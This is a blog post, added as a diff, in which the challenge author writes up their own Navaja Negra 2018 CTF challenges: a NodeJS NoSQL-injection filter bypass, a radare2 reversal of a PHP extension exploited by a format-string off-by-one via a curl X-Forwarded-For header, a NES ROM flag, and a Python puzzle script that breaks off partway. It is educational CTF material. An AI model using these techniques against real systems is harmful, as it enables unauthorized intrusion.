@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Writeup Navaja Negra 2018 CTF | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Writeup Navaja Negra 2018 CTF" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Solutions to the challenges made by me in Navaja Negra CTF (Web, Pwn, Rev. &amp; Misc.)" />
+<meta property="og:description" content="Solutions to the challenges made by me in Navaja Negra CTF (Web, Pwn, Rev. &amp; Misc.)" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/10/11/nn8ed-CTF.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/10/11/nn8ed-CTF.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-10-11T14:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Navaja Negra 2018 CTF" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-10-11T14:00:00+02:00","datePublished":"2018-10-11T14:00:00+02:00","description":"Solutions to the challenges made by me in Navaja Negra CTF (Web, Pwn, Rev. &amp; Misc.)","headline":"Writeup Navaja Negra 2018 CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/10/11/nn8ed-CTF.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/10/11/nn8ed-CTF.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>11 October 2018</small>
+<h1>Writeup Navaja Negra 2018 CTF</h1>
+
+
+<p>        
+For the third consecutive year our crew (<a href="https://twitter.com/ka0labs_">@ka0labs_</a>) set up a CTF competition inside the Navaja Negra (“Black Razor”) security conference. Every year we choose a “popular” animation show in order to perform theme based challenges (The Powerpuff Girls in 2016, Rick&amp;Morty in 2017) being this the year of Pokemon. We play CTFs as <a href="https://ctftime.org/team/812">Insanity</a> and as <a href="https://ctftime.org/team/50611">ID-10-Ts</a>, so our bigger fear was to create challenges with the problems that we saw in other competitions: not well-balanced or “GTF” challenges (Guess The Flag). Here is the write up for the challenges made by me (you can check the writeups of challenges made by other members of ka0labs <a href="https://github.com/ka0labs/ctf-writeups/blob/master/2018/nn8ed/readme.md">here</a>). Enjoy it!</p>
+
+<h2 id="tindermon-web--hard">Tindermon (WEB / HARD)</h2>
+<p>        
+This is the challenge that I am more proud to set up. It is a web application made in NodeJS and MongoDB vulnerable to an easy NoSQL injection, but to exploit the vulnerability succesfully you must bypass a filter. The description of the challenge was:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get the admin password! There is a WAF and it is NodeJS... Easy peasy! http://tindermon.ka0labs.org
+</code></pre></div></div>
+
+<p>The filter was a pain in the ass because it blocked <strong>” ‘ .</strong> chars. The solution to bypass the filter is the abuse of the internal issues in NodeJS 8 related to Unicode chars. Honestly, this <a href="https://github.com/dreadlocked/ctf-writeups/blob/master/nn8ed/README.md">write up</a> by <a href="https://twitter.com/_dreadlocked">@_Dreadlocked</a> explains far better than me how to solve this challenge. Please read it, because it is for far more didactic than anything I can write.</p>
+
+<h2 id="hackgym-pwn--easy">HackGym (PWN / EASY)</h2>
+<p>        
+In this challengue we provide an URL to a website. The description was:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Say the magic word to get the flag!
+
+http://hackgym.ka0labs.org
+</code></pre></div></div>
+<p>        
+The website was a PHPINFO with a bit of text hidden in the HTML:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> See my backup at HackGym.so.bk
+</code></pre></div></div>
+<p>        
+Download the file and open it in Radare2:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mothra@arcadia:/tmp|⇒  r2 HackGym.so.bk
+ -- Welcome, "reenigne"
+[0x00000cf0]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[0x00000cf0]&gt; afl
+0x00000000    2 40           sym.imp.__cxa_finalize
+0x00000bd8    3 23           sym._init
+0x00000c00    1 6            loc.imp._zval_ptr_dtor
+0x00000c10    1 6            loc.imp.zend_parse_parameters
+0x00000c20    1 6            loc.imp.ap_php_snprintf
+0x00000c30    1 6            fcn.00000c30
+0x00000c40    1 6            loc.imp.zend_hash_exists
+0x00000c60    1 6            sub.__JCR_LIST___72_c60
+0x00000c70    1 6            loc.imp.php_printf
+0x00000c80    1 6            loc.imp.php_info_print_table_header
+0x00000c90    1 6            loc.imp._array_init
+0x00000ca0    1 6            loc.imp._emalloc
+0x00000cb0    1 6            loc.imp.php_info_print_table_start
+0x00000cc0    1 6            loc.imp.zend_hash_find
+0x00000cd0    1 6            loc.imp.spprintf
+0x00000ce0    1 6            sub.__cxa_finalize_ce0
+0x00000cf0    4 50   -&gt; 44   entry0
+0x00000d30    4 66   -&gt; 57   sym.register_tm_clones
+0x00000d80    5 50           sym.__do_global_dtors_aux
+0x00000dc0    4 48   -&gt; 42   entry1.init
+0x00000df0    1 3            sym.zm_deactivate_HackGym
+0x00000e00    3 100          sym.zif_confirm_HackGym_compiled
+0x00000e70    1 44           sym.zm_info_HackGym
+0x00000ea0    1 3            sym.zm_shutdown_HackGym
+0x00000eb0    1 3            sym.zm_startup_HackGym
+0x00000ec0    3 114          sym.kaboom
+0x00000f40   15 271  -&gt; 264  sym.PHP_FUNCION
+0x00001050    1 16           sym.zm_activate_HackGym
+0x00001060    1 8            sym.get_module
+0x00001068    1 9            sym._fini
+</code></pre></div></div>
+<p>        
+Seeing the name of the functions (zm_<em>, php_</em>, etc.) we can guess this is a PHP extension (well, even if you just do a strings you can see it <strong>:)</strong>). Two function names are interesting: “kaboom” (for obvious reasons) and “PHP_FUNCION”, because it is spelled in Spanish (FUNCION vs FUNCTION) and is uppercase.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00000cf0]&gt; pdf @ sym.PHP_FUNCION 
+...
+|    ..---&gt; 0x00000fc7      488d35000100.  lea rsi, str.HTTP_X_FORWARDED_FOR ; 0x10ce ; "HTTP_X_FORWARDED_FOR"
+|    ::||   0x00000fce      ba15000000     mov edx, 0x15
+|    ::||   0x00000fd3      e868fcffff     call loc.imp.zend_hash_exists
+|    ::||   0x00000fd8      85c0           test eax, eax
+|   ,=====&lt; 0x00000fda      743d           je 0x1019                   ; /srv/HackGym/php-5.6.36/ext/HackGym/HackGym.c:-9
+|   |::||   0x00000fdc      488b8d980100.  mov rcx, qword [arg_198h]   ; [0x198:8]=0x1d88
+|   |::||   0x00000fe3      0fb65114       movzx edx, byte [rcx + 0x14] ; [0x14:1]=1
+|   |::||   0x00000fe7      80fa04         cmp dl, 4
+|  ,======&lt; 0x00000fea      743c           je 0x1028
+|  ||::||   0x00000fec      31ff           xor edi, edi
+|  ||::||   0x00000fee      80fa05         cmp dl, 5
+| ,=======&lt; 0x00000ff1      744d           je 0x1040
+| |||::||   ; CODE XREF from 0x0000102b (sym.PHP_FUNCION)
+| |||::||   ; CODE XREF from 0x0000104d (sym.PHP_FUNCION)
+| --------&gt; 0x00000ff3      488d4c2408     lea rcx, [local_8h]
+| |||::||   0x00000ff8      488d35cf0000.  lea rsi, str.HTTP_X_FORWARDED_FOR ; 0x10ce ; "HTTP_X_FORWARDED_FOR"
+| |||::||   0x00000fff      ba15000000     mov edx, 0x15
+| |||::||   0x00001004      e8b7fcffff     call loc.imp.zend_hash_find
+| |||::||   0x00001009      488b442408     mov rax, qword [local_8h]   ; [0x8:8]=0
+| |||::||   0x0000100e      488b00         mov rax, qword [rax]        ; /srv/HackGym/php-5.6.36/ext/HackGym/HackGym.c:-10
+| |||::||   0x00001011      488b38         mov rdi, qword [rax]
+| |||::||   0x00001014      e847fcffff     call sym.kaboom
+...
+
+</code></pre></div></div>
+<p>        
+As we can see this extension checks for contents in X-Forwarded-For header and then pass it to our “kaboom” function. Let’s check it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[0x00000ec0]&gt; pdf @ sym.kaboom
+/ (fcn) sym.kaboom 114
+|   sym.kaboom ();
+|           ; var int local_8h @ rsp+0x8
+|           ; var int local_10h @ rsp+0x10
+|           ; var int local_100h @ rsp+0x100
+|           0x00000ec0      53             push rbx
+|           0x00000ec1      488d35d20100.  lea rsi, str.8____D___JE__Target__3 ; 0x109a ; "8====D ! JE! Target! 3%"
+|           0x00000ec8      4881ec000200.  sub rsp, 0x200
+|           0x00000ecf      488b07         mov rax, qword [rdi]
+|           0x00000ed2      4889e2         mov rdx, rsp
+|           0x00000ed5      48890424       mov qword [rsp], rax
+|           0x00000ed9      488b4708       mov rax, qword [rdi + 8]    ; [0x8:8]=0
+|           0x00000edd      4889442408     mov qword [local_8h], rax
+|           0x00000ee2      488b4710       mov rax, qword [rdi + 0x10] ; [0x10:8]=0x1003e0003
+|           0x00000ee6      4889442410     mov qword [local_10h], rax
+|           0x00000eeb      31c0           xor eax, eax
+|           0x00000eed      0f1f00         nop dword [rax]
+|       .-&gt; 0x00000ef0      0fb60c06       movzx ecx, byte [rsi + rax]
+|       :   0x00000ef4      880c02         mov byte [rdx + rax], cl
+|       :   0x00000ef7      4883c001       add rax, 1
+|       :   0x00000efb      4883f817       cmp rax, 0x17
+|       `=&lt; 0x00000eff      75ef           jne 0xef0
+|           0x00000f01      488d9c240001.  lea rbx, [local_100h]       ; 0x100
+|           0x00000f09      488d0da20100.  lea rcx, str.nn8ed_XXXXXX_EDITED_XXXXXX ; 0x10b2 ; "nn8ed{XXXXXX_EDITED_XXXXXX}"
+|           0x00000f10      be00010000     mov esi, 0x100
+|           0x00000f15      31c0           xor eax, eax
+|           0x00000f17      4889df         mov rdi, rbx                ; /srv/HackGym/php-5.6.36/ext/HackGym/HackGym.c:-30
+|           0x00000f1a      e801fdffff     call loc.imp.ap_php_snprintf
+|           0x00000f1f      4889df         mov rdi, rbx
+|           0x00000f22      31c0           xor eax, eax
+|           0x00000f24      e847fdffff     call loc.imp.php_printf
+|           0x00000f29      4881c4000200.  add rsp, 0x200
+|           0x00000f30      5b             pop rbx                     ; /srv/HackGym/php-5.6.36/ext/HackGym/HackGym.c:-24
+\           0x00000f31      c3             ret
+
+</code></pre></div></div>
+<p>        
+So, we have a an string (“8==D…”) that is used to overwrite the string took from the X-Forwarded-For header byte to byte in a loop. Then a php_snprintf is used with this string and the flag, later the result is printed.</p>
+
+<p>        
+This snprintf is weird as hell. We have something like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snprintf(buffer, 256, overwrote_thing, flag);
+php_printf(buffer);
+</code></pre></div></div>
+<p>        
+If we can have a format string (%s) inside the overwrote string we can leak the flag content inside “buffer” and then see it when it is used in the php_printf(). Well, the string used to overwrite ends with “%”, and that is half of a format string <strong>:)</strong>. If we look more carefully the loop we can see an off-by-one, so the byte after the “%” will not be overwritten. If this char is a “s” then we have:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snprintf(buffer, 256, "8====D ! JE! Target! 3%s", flag);
+php_printf(buffer);
+</code></pre></div></div>
+<p>        
+Let’s try it!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[X-C3LL@Kumonga] -&gt; / ⌚  11:27:05
+$ curl http://hackgym.ka0labs.org -H "X-Forwarded-For: XXXXXXXXXXXXXXXXXXXXXXXs" --silent 2&gt;&amp;1 | grep nn8ed
+8====D ! JE! Target! 3nn8ed{Th3_r1ght_f0rm4t_Off_by_1}&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;
+</code></pre></div></div>
+<p>        
+Nice <strong>:)</strong></p>
+
+<h2 id="nesy-rev--very-easy">NESy (REV / VERY EASY)</h2>
+<p>        
+This challenge could be solved in tons of ways. We provided a NES Rom and this description:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Find the flag inside this ROM! It is, literally, in front of you!
+</code></pre></div></div>
+<p>        
+If you read about how NES video works, that “in front of you” is easy to understand. Just execute the ROM and use the video debugger to check all <a href="https://wiki.nesdev.com/w/index.php/PPU_nametables">nametables</a> (the flag was in $2800). Free points for the newbies <strong>:)</strong></p>
+
+<h2 id="pokemon-trilero-misc--easy">Pokemon Trilero (MISC / EASY)</h2>
+<p>        
+A python script and a description are provided:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Insert mew into your team! Use the glitch!
+
+$ nc challenges.ka0labs.org 5000
+
+</code></pre></div></div>
+<p>        
+The python script was:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Stupid Pokemon challenge
+</span>
+
+
+<span class="k">class</span> <span class="nc">registers</span><span class="p">:</span>
+	<span class="n">regs</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="s">"NB"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="s">"SP"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="s">"LP"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="s">"PC"</span> <span class="p">:</span> <span class="mi">0</span>
+	<span class="p">}</span>
+
+
+<span class="n">status</span> <span class="o">=</span> <span class="n">registers</span><span class="p">()</span>
+
+
+<span class="k">class</span> <span class="nc">pokemons</span><span class="p">:</span>
+	<span class="n">boxes</span> <span class="o">=</span> <span class="p">[]</span>
+	<span class="n">starter_team</span> <span class="o">=</span> <span class="p">[</span>
+		<span class="s">"pikachu"</span><span class="p">,</span>
+		<span class="s">"charmander"</span><span class="p">,</span>
+		<span class="s">"squirting"</span><span class="p">,</span>
+		<span class="s">"ekans"</span><span class="p">,</span>
+		<span class="s">"lapras"</span><span class="p">,</span>
+		<span class="s">"dratini"</span><span class="p">,</span>
+		<span class="s">"omastar"</span><span class="p">,</span>
+		<span class="p">]</span>
+	<span class="n">box_one</span> <span class="o">=</span> <span class="p">[</span>
+		<span class="s">"bulbasaur"</span><span class="p">,</span>
+		<span class="s">"wartortle"</span><span class="p">,</span>
+		<span class="s">"raichu"</span><span class="p">,</span>
+		<span class="s">"raticate"</span><span class="p">,</span>
+		<span class="s">"charizard"</span><span class="p">,</span>
+		<span class="s">"ivysaur"</span><span class="p">,</span>
+		<span class="s">"scyther"</span><span class="p">,</span>
+		<span class="s">"golem"</span><span class="p">,</span>
+		<span class="s">"pinsir"</span><span class="p">,</span>
+		<span class="s">"golbat"</span><span class="p">,</span>
+		<span class="s">"mew"</span>
+	<span class="p">]</span>
+	<span class="n">box_two</span> <span class="o">=</span> <span class="p">[</span>
+		<span class="s">"magikarp"</span><span class="p">,</span>
+		<span class="s">"seal"</span><span class="p">,</span>
+		<span class="s">"slowpoke"</span>
+		<span class="p">]</span>
+	<span class="n">boxes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">starter_team</span><span class="p">)</span>
+	<span class="n">boxes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">box_one</span><span class="p">)</span>
+	<span class="n">boxes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">box_two</span><span class="p">)</span>
+
+	<span class="k">def</span> <span class="nf">create_box</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">boxes</span><span class="p">.</span><span class="n">append</span><span class="p">([</span><span class="s">'magikarp'</span><span class="p">])</span>
+	<span class="k">def</span> <span class="nf">destroy_box</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dbox</span><span class="p">):</span>
+		<span class="k">del</span> <span class="bp">self</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">dbox</span><span class="p">]</span>
+	<span class="k">def</span> <span class="nf">move</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sbox</span><span class="p">,</span> <span class="n">dbox</span><span class="p">):</span>
+		<span class="bp">self</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">dbox</span><span class="p">].</span><span class="n">append</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">sbox</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
+		<span class="k">del</span> <span class="bp">self</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">sbox</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+	
+
+<span class="n">a</span> <span class="o">=</span> <span class="n">pokemons</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">print_info</span><span class="p">():</span>
+	<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Register status:</span><span class="se">\n</span><span class="s">---------"</span>
+	<span class="k">print</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span>
+	<span class="k">print</span> <span class="s">"Current team:"</span>
+	<span class="k">print</span> <span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+	<span class="k">print</span> <span class="s">"Total boxes: %s"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">)</span>
+	<span class="k">print</span> <span class="n">a</span><span class="p">.</span><span class="n">boxes</span>
+
+<span class="k">def</span> <span class="nf">parser</span><span class="p">(</span><span class="n">instruction</span><span class="p">):</span>
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"p"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="n">print_info</span><span class="p">()</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">print_info</span><span class="p">()</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"s"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">))</span>
+		<span class="k">print</span> <span class="s">"[+] Moving to box %s"</span> <span class="o">%</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"c"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">a</span><span class="p">.</span><span class="n">create_box</span><span class="p">()</span>
+		<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span>
+		<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+		<span class="k">print</span> <span class="s">"[+] New box created"</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"e"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"1"</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Invalid box!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">print</span> <span class="s">"[+] Box destroyed. Pokemons released:"</span>
+		<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+			<span class="k">print</span> <span class="s">"     "</span> <span class="o">+</span> <span class="n">x</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span>
+			<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+			<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span>
+		<span class="n">a</span><span class="p">.</span><span class="n">destroy_box</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"*"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span>				
+		<span class="k">print</span> <span class="s">"[+] Incremented pointer to: %d"</span> <span class="o">%</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">=</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span>	
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>			
+		<span class="k">print</span> <span class="s">"[+] Decremented pointer to: %d"</span> <span class="o">%</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"SP"</span><span class="p">]</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"t"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Only 8 pokemons!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">print</span> <span class="s">"[+] Adding %s to team"</span> <span class="o">%</span> <span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">]][</span><span class="mi">0</span><span class="p">]</span>
+		<span class="n">a</span><span class="p">.</span><span class="n">move</span><span class="p">(</span><span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"NB"</span><span class="p">],</span><span class="mi">0</span><span class="p">)</span>
+
+	<span class="k">if</span> <span class="n">instruction</span> <span class="o">==</span> <span class="s">"d"</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">status</span><span class="p">.</span><span class="n">regs</span><span class="p">[</span><span class="s">"LP"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"Segfault!!!!"</span>
+			<span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">boxes</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"You can't have 0 pokemons!!!!"</span>
